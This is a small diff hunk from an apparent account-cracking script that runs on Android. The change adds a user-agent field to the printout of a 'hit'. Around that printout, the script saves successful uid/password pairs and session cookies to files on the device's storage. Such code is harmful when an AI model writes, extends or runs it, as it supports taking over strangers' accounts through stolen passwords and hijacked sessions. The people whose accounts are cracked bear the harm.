@@ -602,6 +602,7 @@ def gxds_files(uid, pxss, tl):
  PASS   : {ps} 
  JOINED : {yrs}
  COOKIE : {coki}
+ AGENT  : {ugen}
 """)
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
